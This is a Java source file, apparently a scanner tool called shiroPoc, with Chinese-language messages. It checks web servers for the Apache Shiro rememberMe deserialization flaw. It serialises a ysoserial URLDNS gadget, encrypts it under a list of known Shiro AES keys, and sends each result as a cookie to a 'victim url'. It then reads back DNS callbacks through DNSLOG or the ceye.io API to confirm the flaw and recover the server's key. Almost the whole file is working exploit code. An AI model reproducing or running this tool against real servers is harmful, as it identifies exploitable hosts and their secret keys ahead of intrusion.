package org.unicodesec;


import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import org.apache.commons.io.IOUtils;
import org.apache.http.HttpHeaders;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import yso.payloads.Strings;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

public class poc {
    public static void main(String[] args) throws Exception {

        if (args.length == 0) {
            String text =  "   _____ _     _           _____           \n" +
                    "  / ____| |   (_)         |  __ \\          \n" +
                    " | (___ | |__  _ _ __ ___ | |__) |__   ___ \n" +
                    "  \\___ \\| '_ \\| | '__/ _ \\|  ___/ _ \\ / __|\n" +
                    "  ____) | | | | | | | (_) | |  | (_) | (__ \n" +
                    " |_____/|_| |_|_|_|  \\___/|_|   \\___/ \\___|\n" +
                    "                                           \n" +
                    "                                           ";
            System.out.println(text);
            System.out.println("java -cp org.unicodesec.poc shiroPoc-[version]-all.jar [your DNSLOG url] [victim url]");
            System.out.println("java -cp org.unicodesec.poc shiroPoc-[version]-all.jar [your DNSLOG url] [victim url] [ceye.io token]");
            System.out.println("eg:");
            System.out.println("    " + "java -cp org.unicodesec.poc shiroPoc-[version]-all.jar zbjeyq.dnslog.cn http://127.0.0.1:8080/shiro\n");
            System.err.println("  Available shiro key:");

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"index", "key"});
            rows.add(new String[]{"---------------", "---------------"});
            for (int i = 0; i < keys.keys.length; i++) {
                rows.add(new String[]{
                        String.valueOf(i),
                        keys.keys[i],
                });
            }

            final List<String> lines = Strings.formatTable(rows);
            for (String line : lines) {
                System.err.println("     " + line);
            }
            return;
        }

        if (args.length == 1) {
            int keyIndex = Integer.parseInt(args[0]);
            if (keyIndex < 0 || keyIndex >= keys.keys.length) {
                System.out.println(String.format("key编号的范围不对 key编号的范围为 0-%d", keys.keys.length - 1));
                return;
            }
            System.out.println(String.format("查询的key编号为 %d, key为 %s", keyIndex, keys.keys[keyIndex]));
            return;
        }
        if (args[0].contains("ceye") && args.length < 3) {
            System.out.println("you must provide ceye.io when used ceye dnslog plantform");
            return;
        }
        // 项目名称，每次运行都不一致。因为一会查询dns平台的时候，需要根据这个确定
        String projectName = getRandomString(5);
        String dnslog = args[0];
        String victimUrl = args[1];
        boolean useCeye = args.length == 3;
        System.out.println("Project Name " + projectName);
        CloseableHttpClient httpclient = HttpClients.createDefault();
        for (int i = 0; i < keys.keys.length; i++) {
            byte[] bytes = makeDNSURL(projectName + i + "." + args[0]);
            String rememberMe = EncryptUtil.shiroEncrypt(keys.keys[i], bytes);
            HttpGet request = new HttpGet(victimUrl);
            request.setHeader(HttpHeaders.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36");
            request.setHeader("Cookie", "rememberMe=" + rememberMe);
            CloseableHttpResponse response = httpclient.execute(request);
            if (response.getStatusLine().getStatusCode() == 200) {
                System.out.println("sended " + keys.keys[i] + " success");
            } else {
                System.out.println("sended key failed, status code is" + response.getStatusLine().getStatusCode());
            }
            response.close();
        }

        if (useCeye) {
            // 第三步，从ceye.io 查询dnslog，检查是否成功
            String ceyeToken = args[2];
            URIBuilder builder = new URIBuilder("http://api.ceye.io/v1/records");
            builder.addParameter("token", ceyeToken)
                    .addParameter("type", "dns")
                    .addParameter("filter", args[0]);
            HttpGet httpget = new HttpGet(builder.build());
            CloseableHttpResponse response = httpclient.execute(httpget);
            JSONObject json = JSONObject.parseObject(IOUtils.toString(response.getEntity().getContent(), "utf-8"));
            JSONArray dnslogs = json.getJSONArray("data");
            // 因为dnslog中会显示多次，所以密钥只显示一次
            boolean onlyShowOnce = false;
            System.out.println();
            for (int i = 0; i < dnslogs.size(); i++) {
                JSONObject dnslogObj = dnslogs.getJSONObject(i);
                String dnsName = dnslogObj.getString("name");
                String remoteAddr = dnslogObj.getString("remote_addr");
                String created_at = dnslogObj.getString("created_at");
                if (dnsName.contains(projectName)) {
                    // 从dnslog中找到key的索引值，projectName + key索引值 + . + dnslog地址
                    int key_index = Integer.parseInt(dnsName.substring(projectName.length(), dnsName.indexOf('.')));
                    if (!onlyShowOnce) {
                        System.out.println("该服务器存在shiro反序列化漏洞");
                        System.out.println("aes密钥为 " + keys.keys[key_index]);
                        onlyShowOnce = true;
                    }
                    System.out.println("被攻击服务器请求时间 UTC:" + created_at);
                    System.out.println("请求dnslog的服务器地址" + remoteAddr);
                    System.out.println();
                }
            }

            if (!onlyShowOnce) {
                System.out.println("该服务器不存在shiro反序列化漏洞");
            }
            response.close();
        } else {
            System.out.println(String.format("请人工检查dnslog记录，是否存在 keyindex%s.%s这样的记录，存在则代表服务器存在shiro漏洞。密钥为keyindex", projectName, dnslog));
            System.out.println(String.format("请使用 java -jar shirodns.jar keyindex的方式查询具体密钥值", projectName, dnslog));
        }


    }

    private static byte[] makeDNSURL(String url) throws Exception {
        // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java#L55
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL(null, "http://" + url, handler);
        ht.put(u, url);

        // reset hashCode cache
        Class<?> clazz = u.getClass();
        Field codev = clazz.getDeclaredField("hashCode");
        codev.setAccessible(true);
        codev.set(u, -1);
        return getBytes(ht);
    }

    private static byte[] getBytes(Object obj) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream;
        ObjectOutputStream objectOutputStream;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    public static String getRandomString(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int number = random.nextInt(str.length());
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }

    // https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java#L77
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}

